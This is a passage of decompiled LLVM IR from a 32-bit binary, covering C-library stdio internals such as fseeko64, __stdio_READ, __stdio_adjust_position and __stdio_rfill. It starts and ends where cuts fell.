dec_label_pc_8065973:                             ; preds = %dec_label_pc_806594c, %dec_label_pc_8065962
  %v0_8065979 = phi i32 [ %v5_8065956, %dec_label_pc_806594c ], [ %v4_806596b, %dec_label_pc_8065962 ]
  store i32 %v0_806591e, i32* @ebx, align 4
  store i32 %v0_806591c, i32* @edi, align 4
  ret i32 %v0_8065979

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @__GI_fseek, { 1, 0 }
  uselistorder label %dec_label_pc_8065973, { 1, 0 }
  uselistorder label %dec_label_pc_806594c, { 1, 0 }
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_806599c = load i32, i32* @ebp, align 4
  %v0_806599d = load i32, i32* @edi, align 4
  %v0_806599e = load i32, i32* @esi, align 4
  %v0_806599f = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_80659af = ptrtoint i16* %arg1 to i32
  store i32 %v4_80659af, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp28 = icmp ult i32 %arg4, 3
  br i1 %tmp28, label %dec_label_pc_80659d3, label %dec_label_pc_80659c0

dec_label_pc_80659c0:                             ; preds = %entry
  %v1_80659c0 = call i32 @__errno_location(i32 %arg2)
  store i32 %v1_80659c0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @ebx, align 4
  %v1_80659c8 = inttoptr i32 %v1_80659c0 to i32*
  store i32 22, i32* %v1_80659c8, align 4
  br label %dec_label_pc_8065a75

dec_label_pc_80659d3:                             ; preds = %entry
  %v1_80659d3 = add i32 %v4_80659af, 52
  %v2_80659d3 = inttoptr i32 %v1_80659d3 to i32*
  %v3_80659d3 = load i32, i32* %v2_80659d3, align 4
  store i32 %v3_80659d3, i32* @ebp, align 4
  %v1_80659d6 = icmp eq i32 %v3_80659d3, 0
  %v1_80659d8 = icmp eq i1 %v1_80659d6, false
  br i1 %v1_80659d8, label %dec_label_pc_80659f9, label %dec_label_pc_80659da

dec_label_pc_80659da:                             ; preds = %dec_label_pc_80659d3
  %v1_80659da = add i32 %v4_80659af, 56
  store i32 %v1_80659da, i32* @ebx, align 4
  %v2_80659e4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_80659e4, i32* %eax.global-to-local, align 4
  %v5_80659e9 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-44, i32 134585853, i32 %v1_80659da)
  store i32 %v5_80659e9, i32* %eax.global-to-local, align 4
  %v0_80659ee = load i32, i32* @ebx, align 4
  %v2_80659f1 = call i32 @pthread_mutex_lock(i32 %v0_80659ee)
  store i32 %v2_80659f1, i32* %eax.global-to-local, align 4
  %v0_80659f9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80659f9

dec_label_pc_80659f9:                             ; preds = %dec_label_pc_80659d3, %dec_label_pc_80659da
  %v0_8065a01 = phi i32 [ %v4_80659af, %dec_label_pc_80659d3 ], [ %v0_80659f9.pre, %dec_label_pc_80659da ]
  %v1_80659f9 = inttoptr i32 %v0_8065a01 to i8*
  %v2_80659f9 = load i8, i8* %v1_80659f9, align 1
  %v3_80659f9 = and i8 %v2_80659f9, 64
  %v4_80659f9 = icmp eq i8 %v3_80659f9, 0
  br i1 %v4_80659f9, label %dec_label_pc_8065a0e, label %dec_label_pc_80659fe

dec_label_pc_80659fe:                             ; preds = %dec_label_pc_80659f9
  %v2_8065a02 = call i32 @__stdio_wcommit(i32 %v0_8065a01)
  store i32 %v2_8065a02, i32* %eax.global-to-local, align 4
  %v1_8065a0a = icmp eq i32 %v2_8065a02, 0
  %v1_8065a0c = icmp eq i1 %v1_8065a0a, false
  br i1 %v1_8065a0c, label %dec_label_pc_8065a5d, label %dec_label_pc_8065a0e

dec_label_pc_8065a0e:                             ; preds = %dec_label_pc_80659fe, %dec_label_pc_80659f9
  %v0_8065a0e = load i32, i32* @edi, align 4
  %v9_8065a0e = icmp eq i32 %v0_8065a0e, 1
  %v1_8065a11 = icmp eq i1 %v9_8065a0e, false
  br i1 %v1_8065a11, label %dec_label_pc_8065a0e.dec_label_pc_8065a27_crit_edge, label %dec_label_pc_8065a13

dec_label_pc_8065a0e.dec_label_pc_8065a27_crit_edge: ; preds = %dec_label_pc_8065a0e
  %.pre6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8065a27

dec_label_pc_8065a13:                             ; preds = %dec_label_pc_8065a0e
  %v0_8065a13 = load i32, i32* @ecx, align 4
  %v2_8065a15 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8065a15, i32* %eax.global-to-local, align 4
  %v0_8065a1a = load i32, i32* @esi, align 4
  %tmp26 = inttoptr i32 %v0_8065a1a to i32*
  %v6_8065a1b = call i32 @__stdio_adjust_position(i32* %tmp26, i32 %v2_8065a15, i32 %v0_8065a13, i32 %v0_8065a13)
  store i32 %v6_8065a1b, i32* %eax.global-to-local, align 4
  %v2_8065a23 = icmp slt i32 %v6_8065a1b, 0
  br i1 %v2_8065a23, label %dec_label_pc_8065a5d, label %dec_label_pc_8065a13.dec_label_pc_8065a27_crit_edge

dec_label_pc_8065a13.dec_label_pc_8065a27_crit_edge: ; preds = %dec_label_pc_8065a13
  %v0_8065a28.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8065a27

dec_label_pc_8065a27:                             ; preds = %dec_label_pc_8065a0e.dec_label_pc_8065a27_crit_edge, %dec_label_pc_8065a13.dec_label_pc_8065a27_crit_edge
  %v2_8065a29.pre-phi = phi i32 [ %.pre6, %dec_label_pc_8065a0e.dec_label_pc_8065a27_crit_edge ], [ %v2_8065a15, %dec_label_pc_8065a13.dec_label_pc_8065a27_crit_edge ]
  %v0_8065a28 = phi i32 [ %v0_8065a0e, %dec_label_pc_8065a0e.dec_label_pc_8065a27_crit_edge ], [ %v0_8065a28.pre, %dec_label_pc_8065a13.dec_label_pc_8065a27_crit_edge ]
  %v0_8065a27 = load i32, i32* @edx, align 4
  store i32 %v2_8065a29.pre-phi, i32* %eax.global-to-local, align 4
  %v0_8065a2e = load i32, i32* @esi, align 4
  %v5_8065a2f = inttoptr i32 %v2_8065a29.pre-phi to i32*
  %v6_8065a2f = call i32 @__stdio_seek(i32 %v0_8065a2e, i32* %v5_8065a2f, i32 %v0_8065a28, i32 %v0_8065a27)
  store i32 %v6_8065a2f, i32* %eax.global-to-local, align 4
  %v2_8065a37 = icmp slt i32 %v6_8065a2f, 0
  br i1 %v2_8065a37, label %dec_label_pc_8065a5d, label %dec_label_pc_8065a3b

dec_label_pc_8065a3b:                             ; preds = %dec_label_pc_8065a27
  %v0_8065a3b = load i32, i32* @esi, align 4
  %v1_8065a3b = inttoptr i32 %v0_8065a3b to i16*
  %v2_8065a3b = load i16, i16* %v1_8065a3b, align 2
  %v3_8065a3b = and i16 %v2_8065a3b, -72
  store i16 %v3_8065a3b, i16* %v1_8065a3b, align 2
  %v0_8065a3f = load i32, i32* @esi, align 4
  %v1_8065a3f = add i32 %v0_8065a3f, 8
  %v2_8065a3f = inttoptr i32 %v1_8065a3f to i32*
  %v3_8065a3f = load i32, i32* %v2_8065a3f, align 4
  store i32 %v3_8065a3f, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v2_8065a44 = add i32 %v0_8065a3f, 16
  %v3_8065a44 = inttoptr i32 %v2_8065a44 to i32*
  store i32 %v3_8065a3f, i32* %v3_8065a44, align 4
  %v0_8065a47 = load i32, i32* %eax.global-to-local, align 4
  %v1_8065a47 = load i32, i32* @esi, align 4
  %v2_8065a47 = add i32 %v1_8065a47, 20
  %v3_8065a47 = inttoptr i32 %v2_8065a47 to i32*
  store i32 %v0_8065a47, i32* %v3_8065a47, align 4
  %v0_8065a4a = load i32, i32* %eax.global-to-local, align 4
  %v1_8065a4a = load i32, i32* @esi, align 4
  %v2_8065a4a = add i32 %v1_8065a4a, 24
  %v3_8065a4a = inttoptr i32 %v2_8065a4a to i32*
  store i32 %v0_8065a4a, i32* %v3_8065a4a, align 4
  %v0_8065a4d = load i32, i32* %eax.global-to-local, align 4
  %v1_8065a4d = load i32, i32* @esi, align 4
  %v2_8065a4d = add i32 %v1_8065a4d, 28
  %v3_8065a4d = inttoptr i32 %v2_8065a4d to i32*
  store i32 %v0_8065a4d, i32* %v3_8065a4d, align 4
  %v0_8065a50 = load i32, i32* @esi, align 4
  %v1_8065a50 = add i32 %v0_8065a50, 44
  %v2_8065a50 = inttoptr i32 %v1_8065a50 to i32*
  store i32 0, i32* %v2_8065a50, align 4
  %v0_8065a57 = load i32, i32* @esi, align 4
  %v1_8065a57 = add i32 %v0_8065a57, 2
  %v2_8065a57 = inttoptr i32 %v1_8065a57 to i8*
  store i8 0, i8* %v2_8065a57, align 1
  br label %dec_label_pc_8065a60

dec_label_pc_8065a5d:                             ; preds = %dec_label_pc_8065a27, %dec_label_pc_8065a13, %dec_label_pc_80659fe
  store i32 -1, i32* @ebx, align 4
  br label %dec_label_pc_8065a60

dec_label_pc_8065a60:                             ; preds = %dec_label_pc_8065a3b, %dec_label_pc_8065a5d
  br i1 %v1_80659d8, label %dec_label_pc_8065a75, label %dec_label_pc_8065a64

dec_label_pc_8065a64:                             ; preds = %dec_label_pc_8065a60
  %v2_8065a68 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8065a68, i32* %eax.global-to-local, align 4
  %v4_8065a6d = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-44, i32 1)
  store i32 %v4_8065a6d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065a75

dec_label_pc_8065a75:                             ; preds = %dec_label_pc_8065a60, %dec_label_pc_80659c0, %dec_label_pc_8065a64
  %v0_8065a78 = load i32, i32* @ebx, align 4
  store i32 %v0_8065a78, i32* %eax.global-to-local, align 4
  store i32 %v0_806599f, i32* @ebx, align 4
  store i32 %v0_806599e, i32* @esi, align 4
  store i32 %v0_806599d, i32* @edi, align 4
  store i32 %v0_806599c, i32* @ebp, align 4
  ret i32 %v0_8065a78

; uselistorder directives
  uselistorder i32 %v2_8065a29.pre-phi, { 1, 0 }
  uselistorder i32 %v0_8065a0e, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i8 64, { 10, 0, 6, 7, 11, 12, 8, 9, 2, 13, 1, 3, 4, 5 }
  uselistorder i32 22, { 44, 2, 3, 47, 27, 28, 29, 30, 41, 35, 51, 40, 31, 32, 42, 45, 46, 43, 38, 39, 52, 26, 4, 5, 6, 48, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 33, 16, 50, 17, 18, 34, 19, 1, 20, 21, 22, 23, 49, 36, 37, 24, 25 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8065a75, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8065a60, { 1, 0 }
  uselistorder label %dec_label_pc_8065a27, { 1, 0 }
  uselistorder label %dec_label_pc_80659f9, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8065a80 = load i32, i32* @ebx, align 4
  store i32 %v0_8065a80, i32* %stack_var_-4, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v4_8065a86 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8065a86, i32* @ebx, align 4
  %v1_8065a8e = bitcast i16* %arg1 to i8*
  %v2_8065a8e = load i8, i8* %v1_8065a8e, align 1
  %v3_8065a8e = and i8 %v2_8065a8e, 4
  %v4_8065a8e = icmp eq i8 %v3_8065a8e, 0
  %v1_8065a91 = icmp eq i1 %v4_8065a8e, false
  br i1 %v1_8065a91, label %dec_label_pc_8065ac0, label %dec_label_pc_8065a93

dec_label_pc_8065a93:                             ; preds = %entry
  %v2_8065a93 = icmp slt i32 %arg3, 0
  %v1_8065a95 = icmp eq i1 %v2_8065a93, false
  br i1 %v1_8065a95, label %dec_label_pc_8065a9c, label %dec_label_pc_8065a97

dec_label_pc_8065a97:                             ; preds = %dec_label_pc_8065a93
  br label %dec_label_pc_8065a9c

dec_label_pc_8065a9c:                             ; preds = %dec_label_pc_8065a93, %dec_label_pc_8065a97
  %v0_8065a9d = phi i32 [ %arg3, %dec_label_pc_8065a93 ], [ 2147483647, %dec_label_pc_8065a97 ]
  %v1_8065aa2 = add i32 %v4_8065a86, 4
  %v2_8065aa2 = inttoptr i32 %v1_8065aa2 to i32*
  %v3_8065aa2 = load i32, i32* %v2_8065aa2, align 4
  %v3_8065aa5 = call i32 @__libc_read(i32 %v3_8065aa2, i32 %arg2, i32 %v0_8065a9d)
  store i32 %v3_8065aa5, i32* %eax.global-to-local, align 4
  %tmp13 = icmp slt i32 %v3_8065aa5, 1
  %tmp14 = icmp eq i1 %tmp13, false
  br i1 %tmp14, label %dec_label_pc_8065ac0, label %dec_label_pc_8065ab2

dec_label_pc_8065ab2:                             ; preds = %dec_label_pc_8065a9c
  %v1_8065aad = icmp eq i32 %v3_8065aa5, 0
  %v4_8065ab0 = icmp eq i1 %v1_8065aad, false
  %v0_8065aba = load i32, i32* @ebx, align 4
  %v1_8065aba = inttoptr i32 %v0_8065aba to i16*
  %v2_8065aba = load i16, i16* %v1_8065aba, align 2
  br i1 %v4_8065ab0, label %dec_label_pc_8065aba, label %dec_label_pc_8065ab4

dec_label_pc_8065ab4:                             ; preds = %dec_label_pc_8065ab2
  %v3_8065ab4 = or i16 %v2_8065aba, 4
  store i16 %v3_8065ab4, i16* %v1_8065aba, align 2
  %v0_8065ac3.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065ac0

dec_label_pc_8065aba:                             ; preds = %dec_label_pc_8065ab2
  %v3_8065aba = or i16 %v2_8065aba, 8
  store i16 %v3_8065aba, i16* %v1_8065aba, align 2
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065ac0

dec_label_pc_8065ac0:                             ; preds = %dec_label_pc_8065a9c, %entry, %dec_label_pc_8065ab4, %dec_label_pc_8065aba
  %v0_8065ac3 = phi i32 [ %v3_8065aa5, %dec_label_pc_8065a9c ], [ 0, %entry ], [ %v0_8065ac3.pre, %dec_label_pc_8065ab4 ], [ 0, %dec_label_pc_8065aba ]
  %v2_8065ac2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8065ac2, i32* @ebx, align 4
  ret i32 %v0_8065ac3

; uselistorder directives
  uselistorder i16 %v2_8065aba, { 1, 0 }
  uselistorder i32 %v3_8065aa5, { 1, 2, 0, 3 }
  uselistorder i16 4, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_read, { 0, 4, 3, 5, 2, 1 }
  uselistorder i32 2147483647, { 1, 3, 2, 4, 0 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8065ac0, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_8065a9c, { 1, 0 }
}

define i32 @__stdio_adjust_position(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = ptrtoint i32* %arg1 to i32
  store i32 %tmp6, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_8065ad4 = load i32, i32* %arg1, align 4
  store i32 %v2_8065ad4, i32* %esi.global-to-local, align 4
  %v1_8065adb = urem i32 %v2_8065ad4, 4
  %v2_8065adb = icmp eq i32 %v1_8065adb, 0
  store i32 %v1_8065adb, i32* @ecx, align 4
  br i1 %v2_8065adb, label %dec_label_pc_8065b0a, label %dec_label_pc_8065ae0

dec_label_pc_8065ae0:                             ; preds = %entry
  %v1_8065ae2 = add nsw i32 %v1_8065adb, -1
  %v8_8065ae2 = icmp eq i32 %v1_8065ae2, 0
  store i32 %v1_8065ae2, i32* @edx, align 4
  br i1 %v8_8065ae2, label %dec_label_pc_8065b0a, label %dec_label_pc_8065ae5

dec_label_pc_8065ae5:                             ; preds = %dec_label_pc_8065ae0
  %v3_8065ae5 = and i32 %v2_8065ad4, 2048
  %v4_8065ae5 = icmp eq i32 %v3_8065ae5, 0
  br i1 %v4_8065ae5, label %dec_label_pc_8065b0a, label %dec_label_pc_8065aea

dec_label_pc_8065aea:                             ; preds = %dec_label_pc_8065ae5
  %v6_8065aea = sub nsw i32 1, %v1_8065adb
  %v7_8065aea = and i32 %v1_8065ae2, %v6_8065aea
  %v8_8065aea = icmp slt i32 %v7_8065aea, 0
  %v9_8065aea = icmp eq i32 %v1_8065adb, 2
  %v10_8065aea = icmp ult i32 %v1_8065adb, 2
  %v3_8065aed = icmp eq i1 %v10_8065aea, %v8_8065aea
  %v4_8065aed = icmp eq i1 %v9_8065aea, false
  %v5_8065aed = and i1 %v4_8065aed, %v3_8065aed
  br i1 %v5_8065aed, label %dec_label_pc_8065b60, label %dec_label_pc_8065aef

dec_label_pc_8065aef:                             ; preds = %dec_label_pc_8065aea
  %v1_8065aef = add i32 %tmp6, 40
  %v2_8065aef = inttoptr i32 %v1_8065aef to i32*
  %v3_8065aef = load i32, i32* %v2_8065aef, align 4
  %v4_8065aef = icmp eq i32 %v3_8065aef, 0
  %v1_8065af3 = icmp eq i1 %v4_8065aef, false
  br i1 %v1_8065af3, label %dec_label_pc_8065b60, label %dec_label_pc_8065af5

dec_label_pc_8065af5:                             ; preds = %dec_label_pc_8065aef
  %v1_8065af5 = add i32 %tmp6, 3
  %v2_8065af5 = inttoptr i32 %v1_8065af5 to i8*
  %v3_8065af5 = load i8, i8* %v2_8065af5, align 1
  %v4_8065af5 = zext i8 %v3_8065af5 to i32
  %v2_8065af9 = sub nsw i32 %v1_8065ae2, %v4_8065af5
  %v1_8065afb = add i32 %tmp6, 44
  %v2_8065afb = inttoptr i32 %v1_8065afb to i32*
  %v3_8065afb = load i32, i32* %v2_8065afb, align 4
  %v1_8065aff = add nsw i32 %v2_8065af9, -1
  %tmp12 = icmp slt i32 %v3_8065afb, 1
  br i1 %tmp12, label %dec_label_pc_8065b0a, label %dec_label_pc_8065b04

dec_label_pc_8065b04:                             ; preds = %dec_label_pc_8065af5
  %v1_8065b04 = add i32 %tmp6, 2
  %v2_8065b04 = inttoptr i32 %v1_8065b04 to i8*
  %v3_8065b04 = load i8, i8* %v2_8065b04, align 1
  %v4_8065b04 = zext i8 %v3_8065b04 to i32
  %v2_8065b08 = sub nsw i32 %v1_8065aff, %v4_8065b04
  br label %dec_label_pc_8065b0a

dec_label_pc_8065b0a:                             ; preds = %dec_label_pc_8065af5, %dec_label_pc_8065ae5, %dec_label_pc_8065ae0, %entry, %dec_label_pc_8065b04
  %v0_8065b21 = phi i32 [ %v1_8065aff, %dec_label_pc_8065af5 ], [ %v1_8065ae2, %dec_label_pc_8065ae5 ], [ 0, %dec_label_pc_8065ae0 ], [ 0, %entry ], [ %v2_8065b08, %dec_label_pc_8065b04 ]
  %v2_8065b0a = and i32 %v2_8065ad4, 64
  %v3_8065b0a = icmp eq i32 %v2_8065b0a, 0
  %storemerge.in.in.v = select i1 %v3_8065b0a, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp6
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_8065b19 = add i32 %tmp6, 16
  %v3_8065b19 = inttoptr i32 %v2_8065b19 to i32*
  %v4_8065b19 = load i32, i32* %v3_8065b19, align 4
  %v5_8065b19 = sub i32 %storemerge, %v4_8065b19
  %v1_8065b1c = inttoptr i32 %arg2 to i32*
  %v2_8065b1c = load i32, i32* %v1_8065b1c, align 4
  store i32 %v2_8065b1c, i32* @ecx, align 4
  %v1_8065b1e = add i32 %arg2, 4
  %v2_8065b1e = inttoptr i32 %v1_8065b1e to i32*
  %v3_8065b1e = load i32, i32* %v2_8065b1e, align 4
  store i32 %v3_8065b1e, i32* %ebx.global-to-local, align 4
  %v2_8065b21 = add i32 %v5_8065b19, %v0_8065b21
  store i32 %v2_8065b21, i32* %esi.global-to-local, align 4
  %v2_8065b2c = ashr i32 %v2_8065b21, 31
  %v5_8065b35 = sub i32 %v2_8065b1c, %v2_8065b21
  %v10_8065b35 = icmp ult i32 %v2_8065b1c, %v2_8065b21
  %v6_8065b39 = zext i1 %v10_8065b35 to i32
  %tmp = icmp slt i32 %v2_8065b21, 0
  %v2_8065b2c.neg = zext i1 %tmp to i32
  %v7_8065b39 = add i32 %v3_8065b1e, %v2_8065b2c.neg
  %v8_8065b39 = add i32 %v7_8065b39, %v6_8065b39
  store i32 %v8_8065b39, i32* @edx, align 4
  store i32 %v5_8065b35, i32* %v1_8065b1c, align 4
  %v0_8065b3f = load i32, i32* @edx, align 4
  %v1_8065b3f = load i32, i32* %edi.global-to-local, align 4
  %v2_8065b3f = add i32 %v1_8065b3f, 4
  %v3_8065b3f = inttoptr i32 %v2_8065b3f to i32*
  store i32 %v0_8065b3f, i32* %v3_8065b3f, align 4
  %v0_8065b42 = load i32, i32* %edi.global-to-local, align 4
  %v1_8065b42 = add i32 %v0_8065b42, 4
  %v2_8065b42 = inttoptr i32 %v1_8065b42 to i32*
  %v3_8065b42 = load i32, i32* %v2_8065b42, align 4
  %v4_8065b42 = load i32, i32* %ebx.global-to-local, align 4
  %v5_8065b45 = icmp slt i32 %v3_8065b42, %v4_8065b42
  br i1 %v5_8065b45, label %dec_label_pc_8065b4f, label %dec_label_pc_8065b47

dec_label_pc_8065b47:                             ; preds = %dec_label_pc_8065b0a
  %v8_8065b47 = icmp sgt i32 %v3_8065b42, %v4_8065b42
  br i1 %v8_8065b47, label %dec_label_pc_8065b4d, label %dec_label_pc_8065b49

dec_label_pc_8065b49:                             ; preds = %dec_label_pc_8065b47
  %v1_8065b49 = inttoptr i32 %v0_8065b42 to i32*
  %v2_8065b49 = load i32, i32* %v1_8065b49, align 4
  %v3_8065b49 = load i32, i32* @ecx, align 4
  %tmp14 = icmp ugt i32 %v2_8065b49, %v3_8065b49
  br i1 %tmp14, label %dec_label_pc_8065b4d, label %dec_label_pc_8065b4f

dec_label_pc_8065b4d:                             ; preds = %dec_label_pc_8065b49, %dec_label_pc_8065b47
  %v0_8065b4d = load i32, i32* %esi.global-to-local, align 4
  %v1_8065b4d = sub i32 0, %v0_8065b4d
  store i32 %v1_8065b4d, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8065b4f

dec_label_pc_8065b4f:                             ; preds = %dec_label_pc_8065b49, %dec_label_pc_8065b0a, %dec_label_pc_8065b4d
  %v0_8065b4f = load i32, i32* %esi.global-to-local, align 4
  %v2_8065b4f = icmp slt i32 %v0_8065b4f, 0
  %v1_8065b51 = icmp eq i1 %v2_8065b4f, false
  br i1 %v1_8065b51, label %dec_label_pc_8065b63, label %dec_label_pc_8065b53

dec_label_pc_8065b53:                             ; preds = %dec_label_pc_8065b4f
  %v1_8065b53 = call i32 @__errno_location(i32 %v2_8065b2c)
  %v1_8065b58 = inttoptr i32 %v1_8065b53 to i32*
  store i32 75, i32* %v1_8065b58, align 4
  %v0_8065b66.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8065b63

dec_label_pc_8065b60:                             ; preds = %dec_label_pc_8065aef, %dec_label_pc_8065aea
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8065b63

dec_label_pc_8065b63:                             ; preds = %dec_label_pc_8065b4f, %dec_label_pc_8065b53, %dec_label_pc_8065b60
  %v0_8065b66 = phi i32 [ %v0_8065b4f, %dec_label_pc_8065b4f ], [ %v0_8065b66.pre, %dec_label_pc_8065b53 ], [ -1, %dec_label_pc_8065b60 ]
  ret i32 %v0_8065b66

; uselistorder directives
  uselistorder i32 %v4_8065b42, { 1, 0 }
  uselistorder i32 %v3_8065b42, { 1, 0 }
  uselistorder i32 %v1_8065ae2, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_8065adb, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v2_8065ad4, { 2, 1, 0, 3 }
  uselistorder i32 %tmp6, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 75, { 2, 1, 0 }
  uselistorder i32 2048, { 4, 3, 7, 5, 6, 8, 0, 9, 1, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8065b63, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8065b4f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8065b0a, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_8065b6c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8065b74 = add i32 %arg1, 8
  %v2_8065b74 = inttoptr i32 %v1_8065b74 to i32*
  %v3_8065b74 = load i32, i32* %v2_8065b74, align 4
  store i32 %v3_8065b74, i32* %edx.global-to-local, align 4
  %v1_8065b77 = add i32 %arg1, 12
  %v2_8065b77 = inttoptr i32 %v1_8065b77 to i32*
  %v3_8065b77 = load i32, i32* %v2_8065b77, align 4
  %v2_8065b7a = sub i32 %v3_8065b77, %v3_8065b74
  %v3_8065b7f = inttoptr i32 %arg1 to i16*
  %v4_8065b7f = call i32 @__stdio_READ(i16* %v3_8065b7f, i32 %v3_8065b74, i32 %v2_8065b7a)
  %v0_8065b84 = load i32, i32* @ebx, align 4
  %v1_8065b84 = add i32 %v0_8065b84, 8
  %v2_8065b84 = inttoptr i32 %v1_8065b84 to i32*
  %v3_8065b84 = load i32, i32* %v2_8065b84, align 4
  store i32 %v3_8065b84, i32* %edx.global-to-local, align 4
  %v2_8065b87 = add i32 %v0_8065b84, 16
  %v3_8065b87 = inttoptr i32 %v2_8065b87 to i32*
  store i32 %v3_8065b84, i32* %v3_8065b87, align 4
  %v0_8065b8a = load i32, i32* %edx.global-to-local, align 4
  %v2_8065b8a = add i32 %v0_8065b8a, %v4_8065b7f
  store i32 %v2_8065b8a, i32* %edx.global-to-local, align 4
  %v1_8065b8c = load i32, i32* @ebx, align 4
  %v2_8065b8c = add i32 %v1_8065b8c, 20
  %v3_8065b8c = inttoptr i32 %v2_8065b8c to i32*
  store i32 %v2_8065b8a, i32* %v3_8065b8c, align 4
  store i32 %v0_8065b6c, i32* @ebx, align 4
  ret i32 %v4_8065b7f

; uselistorder directives
  uselistorder i32 %v4_8065b7f, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8065b94 = load i32, i32* @ebx, align 4
  %v4_8065b98 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8065b98, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_8065ba0 = bitcast i16* %arg1 to i32*
  %v2_8065ba0 = load i32, i32* %v1_8065ba0, align 4
  %v1_8065ba2 = urem i32 %v2_8065ba0, 65536
  %v2_8065ba5 = and i32 %v1_8065ba2, %arg2
  %v3_8065ba5 = icmp eq i32 %v2_8065ba5, 0
  %v1_8065ba7 = icmp eq i1 %v3_8065ba5, false
  br i1 %v1_8065ba7, label %dec_label_pc_8065bb6, label %dec_label_pc_8065ba9

dec_label_pc_8065ba9:                             ; preds = %entry
  %v1_8065ba9 = and i32 %v2_8065ba0, 2176
  %v2_8065ba9 = icmp eq i32 %v1_8065ba9, 0
  %v1_8065baf = icmp eq i1 %v2_8065ba9, false
  br i1 %v1_8065baf, label %dec_label_pc_8065bbd, label %dec_label_pc_8065bb1

dec_label_pc_8065bb1:                             ; preds = %dec_label_pc_8065ba9
  %v2_8065bb1 = or i32 %v2_8065ba0, %arg2
  %v1_8065bb3 = trunc i32 %v2_8065bb1 to i16
  store i16 %v1_8065bb3, i16* %arg1, align 2
  %v0_8065bb6.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8065bb6

dec_label_pc_8065bb6:                             ; preds = %entry, %dec_label_pc_8065bb1
  %v0_8065bd8 = phi i32 [ %v4_8065b98, %entry ], [ %v0_8065bb6.pre, %dec_label_pc_8065bb1 ]
  %v1_8065bb6 = inttoptr i32 %v0_8065bd8 to i16*
  %v2_8065bb6 = load i16, i16* %v1_8065bb6, align 2
  %v2_8065bb9 = and i16 %v2_8065bb6, 16
  %v3_8065bb9 = icmp eq i16 %v2_8065bb9, 0
  br i1 %v3_8065bb9, label %dec_label_pc_8065bd1, label %dec_label_pc_8065bbd

dec_label_pc_8065bbd:                             ; preds = %dec_label_pc_8065bb6, %dec_label_pc_8065ba9
  %v1_8065bbd = call i32 @__errno_location(i32 %v0_8065b94)
  %v1_8065bc2 = inttoptr i32 %v1_8065bbd to i32*
  store i32 9, i32* %v1_8065bc2, align 4
  br label %dec_label_pc_8065bc8

dec_label_pc_8065bc8:                             ; preds = %dec_label_pc_8065bd5, %dec_label_pc_8065bbd
  %v0_8065bc8 = load i32, i32* @ebx, align 4
  %v1_8065bc8 = inttoptr i32 %v0_8065bc8 to i16*
